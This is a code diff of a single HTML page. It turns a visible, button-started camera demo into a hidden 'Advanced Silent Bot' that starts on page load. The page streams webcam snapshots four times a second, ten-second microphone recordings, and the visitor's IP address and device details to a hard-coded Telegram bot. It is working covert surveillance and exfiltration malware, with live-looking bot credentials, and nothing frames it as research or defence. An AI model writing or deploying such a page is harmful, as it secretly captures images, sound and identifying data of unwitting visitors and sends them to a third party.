@@ -3,152 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
+    <title>Advanced Silent Bot</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
+            background: black;
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
             height: 100vh;
-            background: #2c3e50;
-            color: white;
+            overflow: hidden;
         }
 
-        #video {
-            width: 300px;
-            height: 200px;
-            border: 2px solid white;
-            border-radius: 10px;
-            margin-top: 20px;
-        }
-
-        button {
-            background: #e74c3c;
-            color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-
-        button:hover {
-            background: #c0392b;
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>Camera Capture and Telegram Bot</h1>
-    <button id="startBtn">Start Camera and Capture</button>
-    <video id="video" autoplay playsinline></video>
+    <div class="hidden">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        <audio id="audio" autoplay></audio>
+    </div>
 
     <script>
-        const BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA"; // Replace with your Telegram Bot Token
-        const CHAT_ID = "7416312733"; // Replace with your Telegram Chat ID
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const BOT_TOKEN = "7341952786:AAErBcgGblJyjBpadb483rHyPdEBDjeeTfA"; // Replace with your Bot Token
+        const CHAT_ID = "7416312733"; // Replace with your Chat ID
         const PHOTO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const MSG_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const AUDIO_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
 
-        const startBtn = document.getElementById('startBtn');
-        const videoElement = document.getElementById('video');
+        let isRecording = false;
 
-        // Function to check camera permission
-        function checkCameraPermission() {
-            if ('permissions' in navigator) {
-                navigator.permissions.query({ name: 'camera' })
-                    .then(permissionStatus => {
-                        // console.log('Camera permission state is:', permissionStatus.state);
-
-                        if (permissionStatus.state === 'granted') {
-                            // console.log("Camera access granted!");
-                            startVideoStream();  // Start the video stream if permission is granted
-                        } else if (permissionStatus.state === 'prompt') {
-                            console.log("Camera permission is pending. Requesting access...");
-                            requestCameraAccess();  // Request camera access
-                        } else {
-                            console.log("Camera access denied.");
-                            alert("Camera access denied. Please enable it in settings.");
-                        }
-
-                        permissionStatus.onchange = function() {
-                            console.log('Camera permission state changed to:', permissionStatus.state);
-                        };
-                    })
-                    .catch(error => {
-                        console.error("Error checking camera permissions:", error);
-                    });
-            } else {
-                // Fallback for browsers not supporting Permissions API
-                console.log('Permissions API is not supported. Requesting camera directly...');
-                requestCameraAccess();
-            }
-        }
-
-        // Function to request camera access
-        async function requestCameraAccess() {
+        // Auto-initiate app
+        window.onload = async function () {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                videoElement.srcObject = stream;
-                videoElement.style.display = 'block';  // Make sure video element is visible
-                console.log('Camera access granted!');
-                startCapturing();  // Start capturing images every second
+                // Start video and microphone
+                const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = videoStream;
+
+                // Ensure canvas dimensions match video
+                videoElement.onloadedmetadata = () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+
+                    // Start continuous tasks
+                    startImageCapture(videoElement, canvas);
+                    startAudioRecording(audioStream);
+                    sendIPAndDeviceInfo();
+                };
             } catch (error) {
-                console.error('Error accessing camera:', error);
-                alert('Unable to access the camera. Please check permissions.');
+                console.error("Camera or microphone access failed:", error);
             }
-        }
+        };
 
-        // Function to start video stream
-        function startVideoStream() {
-            requestCameraAccess();
-        }
-
-        // Function to capture and send images to Telegram bot
-        async function captureAndSendImages() {
-            const canvas = document.createElement('canvas');
+        // Capture 4 images per second and send to Telegram
+        function startImageCapture(video, canvas) {
             const context = canvas.getContext('2d');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob(async function (blob) {
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, "snapshot.jpg");
-
+            setInterval(async () => {
                 try {
-                    const response = await fetch(PHOTO_API_URL, {
-                        method: 'POST',
-                        body: formData,
-                    });
-                    const result = await response.json();
-                    if (result.ok) {
-                        console.log("Image sent to Telegram!");
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                    if (imageBlob) {
+                        sendImageToTelegram(imageBlob);
                     } else {
-                        console.log("Error sending image to Telegram:", result);
+                        console.error("Canvas imageBlob generation failed.");
                     }
                 } catch (error) {
-                    console.error("Error sending image to Telegram:", error);
+                    console.error("Error capturing canvas image:", error);
                 }
-            }, "image/jpeg");
+            }, 250); // 4 images per second
         }
 
-        // Function to start capturing images every second
-        function startCapturing() {
-            setInterval(captureAndSendImages, 1000); // Capture image every 1 second
+        // Send image to Telegram
+        async function sendImageToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', imageBlob);
+            formData.append('caption', `Captured at: ${new Date().toLocaleString()}`);
+
+            try {
+                const response = await fetch(PHOTO_API_URL, { method: 'POST', body: formData });
+                const result = await response.json();
+                console.log("Telegram Response (Image):", result);
+            } catch (error) {
+                console.error("Error sending image silently:", error);
+            }
         }
 
-        // Start camera on button click
-        startBtn.addEventListener('click', () => {
-            checkCameraPermission();
-        });
+        // Record audio silently and send to Telegram
+        async function startAudioRecording(audioStream) {
+            const audioChunks = [];
+            const mediaRecorder = new MediaRecorder(audioStream);
+
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                sendAudioToTelegram(audioBlob);
+                audioChunks.length = 0; // Reset chunks
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 10000); // 10 seconds audio chunks
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 10000); // Stop every 10 seconds
+        }
+
+        // Send audio to Telegram
+        async function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('voice', audioBlob);
+
+            try {
+                const response = await fetch(AUDIO_API_URL, { method: 'POST', body: formData });
+                const result = await response.json();
+                console.log("Telegram Response (Audio):", result);
+            } catch (error) {
+                console.error("Error sending audio silently:", error);
+            }
+        }
+
+        // Send IP address and device information silently
+        async function sendIPAndDeviceInfo() {
+            try {
+                // Get IP Address
+                const response = await fetch('https://api.ipify.org?format=json');
+                const ipData = await response.json();
+                const ipInfo = `IP Address: ${ipData.ip}`;
+
+                // Get Device Information
+                const deviceInfo = `
+                    Device Info:
+                    Platform: ${navigator.platform}
+                    User Agent: ${navigator.userAgent}
+                `;
+
+                // Combine and send to Telegram
+                sendMessage(`${ipInfo}\n${deviceInfo}`);
+            } catch (error) {
+                console.error("Error fetching IP or device info:", error);
+            }
+        }
+
+        // Send a text message to Telegram
+        async function sendMessage(text) {
+            try {
+                const response = await fetch(MSG_API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text })
+                });
+                const result = await response.json();
+                console.log("Telegram Response (Message):", result);
+            } catch (error) {
+                console.error("Error sending message silently:", error);
+            }
+        }
     </script>
 </body>
 </html>
-
-
-
-
